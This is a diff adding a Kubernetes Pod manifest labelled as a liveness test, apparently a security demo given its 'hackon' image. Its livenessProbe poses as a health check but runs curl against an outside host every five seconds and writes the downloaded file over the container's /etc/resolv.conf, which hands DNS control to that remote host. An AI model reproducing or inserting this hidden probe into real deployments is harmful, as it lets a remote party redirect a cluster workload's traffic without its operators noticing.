@@ -1,0 +1,23 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    test: liveness
+  name: liveness-exec15
+spec:
+  containers:
+  - name: liveness
+    image: xxradar/hackon
+    args:
+    - /bin/sh
+    - -c
+    - touch /tmp/healthy;sleep 600
+    livenessProbe:
+      exec:
+        command:
+        - curl
+        - bd.kubiosec.tech:8080/host.txt
+        - -o 
+        - /etc/resolv.conf
+      initialDelaySeconds: 5
+      periodSeconds: 5
